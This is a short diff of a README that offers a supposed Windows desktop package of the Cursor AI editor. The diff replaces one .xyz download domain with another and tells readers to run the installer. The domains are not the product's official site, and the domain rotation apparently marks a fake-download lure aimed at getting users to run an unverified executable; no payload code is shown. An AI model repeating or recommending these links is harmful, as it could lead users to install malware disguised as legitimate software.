@@ -8,8 +8,8 @@ Cursor desktop package for Windows · ai toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[cursor.nexpath.xyz](https://cursor.nexpath.xyz/)**
-* **Full URL:** `https://cursor.nexpath.xyz/`
+* **Project link:** **[cursor.nerasix.xyz](https://cursor.nerasix.xyz/)**
+* **Full URL:** `https://cursor.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
